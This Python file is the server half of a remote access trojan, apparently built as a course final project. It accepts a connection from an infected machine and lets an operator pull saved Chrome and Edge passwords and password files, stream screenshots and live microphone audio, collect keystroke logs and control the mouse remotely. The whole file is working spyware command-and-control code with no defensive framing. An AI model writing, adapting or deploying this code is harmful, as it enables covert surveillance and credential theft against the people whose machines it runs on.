import socket
import struct
import pyautogui
import time
import pyWinhook
import pythoncom
import os
import multiprocessing
import cv2
import threading
import pyaudio
import keyboard

global mouseC
mouseC = ""
socketList = []
folder_path = "D:\Desktop\CSE433\FinalProject\CSE433FinalProject\screen capture\img\screenshots\screenshots"
display_time = 0.2

def deal_data(conn):
    print("receiving files from client")
    while 1:
        fileinfo_size = struct.calcsize('128sl')
        buf = conn.recv(fileinfo_size)
        if buf:
            filename, filesize = struct.unpack('128sl', buf)
            fn = filename.strip(b'\00')
            fn = fn.decode()
            print ('file new name is {0}, filesize is {1}'.format(str(fn),filesize))
 
            recvd_size = 0  # 定义已接收文件的大小
            # 存储在该脚本所在目录下面
            fp = open('./' + str(fn), 'wb')
            print ('start receiving...')
            
            # 将分批次传输的二进制流依次写入到文件
            while not recvd_size == filesize:
                if filesize - recvd_size > 1024:
                    data = conn.recv(1024)
                    recvd_size += len(data)
                else:
                    data = conn.recv(filesize - recvd_size)
                    recvd_size = filesize
                fp.write(data)
            fp.close()
            print ('end receive...')
        break
    return True

def recv_pass(conn):
    print("======== start searching password ========")
    os.makedirs("pass_folder", exist_ok=True)
    buf = 1
    times = 0
    num_file = 0
    num_recv = 0
    while buf:
        fileinfo_size = struct.calcsize('128sl')
        if (num_file == 0):
            num_recv_packed = conn.recv(4)
            num_file = struct.unpack('!I', num_recv_packed)[0]
            print("num of file: ", num_file)
        buf = conn.recv(fileinfo_size)

        if buf:
            if times == 0:
                print("======== start receiving password ========")
                times = 1
            filename, filesize = struct.unpack('128sl', buf)
            fn = filename.strip(b'\00')
            fn = fn.decode()
            print ('file new name is {0}, filesize is {1}'.format(str(fn),filesize))

            recvd_size = 0
            try:
                fp = open('./pass_folder/' + str(fn), 'wb')
                print ('start receiving...')
            
                while not recvd_size == filesize:
                    if filesize - recvd_size > 1024:
                        data = conn.recv(1024)
                        recvd_size += len(data)
                    else:
                        data = conn.recv(filesize - recvd_size)
                        recvd_size = filesize
                    fp.write(data)
                fp.close()
                num_recv += 1
            except:
                continue
        print ('end receive...')
        if (num_recv == num_file):
            break
    print("======== finish receiving password ========")
    return True

# Send command
def sendCmd(cmd):
    socketList[0].send(cmd.encode('UTF-8'))

    
def sendData():
    def onMouseEvent(event):
        x_size, y_size = pyautogui.size()
        x,y = pyautogui.position()
        x_pos = str(x).rjust(4)
        y_pos = str(y).rjust(4)
        x_relative = int(x_pos) / x_size
        y_relative = int(y_pos) / y_size
        pos = "," + str(x_relative) + "," + str(y_relative)
        if event.MessageName == "mouse left down":
            mouseC = "," + "LD" + pos
            socketList[0].send(mouseC.encode('UTF-8'))
        elif event.MessageName == "mouse left up":
            mouseC = "," + "LU" + pos
            socketList[0].send(mouseC.encode('UTF-8'))
        elif event.MessageName == "mouse right down":
            mouseC = "," + "RD" + pos
            socketList[0].send(mouseC.encode('UTF-8'))
        elif event.MessageName == "mouse right up":
            mouseC = "," + "RU" + pos
            socketList[0].send(mouseC.encode('UTF-8'))
        else:
            mouseC = "," + pos
            socketList[0].send(mouseC.encode('UTF-8'))
        return True
    if __name__ == "__main__":
        hm = pyWinhook.HookManager()
        hm.MouseAll = onMouseEvent
        hm.HookMouse()
        pythoncom.PumpMessages()


def generate():
    os.system("generateWindow.exe")

def monitoring():
    flag = 0
    print("========== start showing images  ==========")
    cv2.namedWindow('Real-time Screenshots',cv2.WINDOW_NORMAL)
    while True:
        # Fetch all files in the folder
        images = [img for img in os.listdir(folder_path) if img.endswith(".png") or img.endswith(".jpg")]
        images.sort()  # Sort the images by name
        if images != []:
            for img in images:
                img_path = os.path.join(folder_path, img)
                image = cv2.imread(img_path)
                try:
                    cv2.imshow('Real-time Screenshots', image)
                except:
                    continue
                # os.remove(img_path)
                # Wait for display_time or until a key is pressed
                if cv2.waitKey(int(display_time * 1000)) & 0xFF == ord('q'):
                    flag = 1
                    break
        if flag:
            break
    cv2.destroyAllWindows()

def recv_img(conn):
    print("======= client is taking screenshots ======")
    img_num = 1
    flag = True
    while img_num<=100:
        image_size = int.from_bytes(conn.recv(4), byteorder='big')
        if flag:
            print("========== receiving screenshots ==========")
            flag = False
        image_data = conn.recv(image_size)
        received_image_path = "D:\Desktop\CSE433\FinalProject\CSE433FinalProject\screen capture\img\screenshots\screenshots\screen" + str(img_num) + ".jpg"
        img_num += 1
        try:
            # Open a new file and write the received image data
            with open(received_image_path, 'wb') as received_file:
                received_file.write(image_data)
            #print(f"Image received and saved to {received_image_path}")
        except Exception as e:
            print(f"Error: {e}")
    monitoring()

def mic_listen(conn):
    print("========== listening microphone ==========")
    p = pyaudio.PyAudio()
    stream = p.open(format=pyaudio.paInt16,
        channels=1,
        rate=44100,
        output=True,
        frames_per_buffer=1024)
    while True:
        data = conn.recv(1024)
        stream.write(data)
        if keyboard.is_pressed('q'):
            break
    sendCmd("q")
    stream.stop_stream()
    stream.close()
    p.terminate()

def keyboard_listen(conn):
    print("========== listening keyboard ==========")
    while True:
        if keyboard.is_pressed('q'):
            break
    sendCmd("q")
    size = int.from_bytes(conn.recv(4), byteorder='big')
    data = conn.recv(size).decode('utf-8')
    data = data.split('\n')
    with open("keyboard_activity.txt", 'w') as file:
        for i in range(len(data)):
            file.write(data[i])
            if (i % 10 == 9):
                file.write("\n")
        print("successfully write keyboard_activity.txt")
    
def main():
    p1 = multiprocessing.Process(target=generate)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', 58868))
    print("Waiting for connection")
    s.listen(1024)
    conn, addr = s.accept()
    socketList.append(conn)
    print(f"Client with IP: {addr} connected. Start contolling {addr}")
    while True:
        print('*' * 50)
        cmd_str = input("$ ")
        sendCmd(cmd_str)
        if cmd_str[0] == "m" and cmd_str[1] == "o":
            print("controlling mouse movement.")
            p1.start()
            while True:
                sendData()
                time.sleep(0.02)
                
        if cmd_str[0] == "s" and cmd_str[1] == "e":
            deal_data(conn)
        
        if cmd_str[0] == "f" and cmd_str[1] == "i":
            length = int.from_bytes(conn.recv(4), byteorder='big')
            information_ls = conn.recv(20480).decode('utf-8').split(";")
            with open("Chrome_Edge_password.txt", 'w') as file:
                for i in range(len(information_ls)//3):
                    file.write("Url: " + information_ls[i*3] + '\n')
                    file.write("username: " + information_ls[i*3+1] + '\n')
                    file.write("password: " + information_ls[i*3+2] + '\n')
                    file.write("*"*50 + '\n')
                print("Successfully create Chrome_Edge_password.txt")
            recv_pass(conn)
        if cmd_str[0] == "s" and cmd_str[1] == "c":
            recv_img(conn)

        if cmd_str[0] == "m" and cmd_str[1] == "i":
            mic_listen(conn)

        if cmd_str[0] == "k" and cmd_str[1] == "e":
            keyboard_listen(conn)
        
        if cmd_str[0] == "q" and cmd_str[1] == "u":
            s.close()
            conn.close()
            break

if __name__ == '__main__':
    main()
    

#window.mainloop()
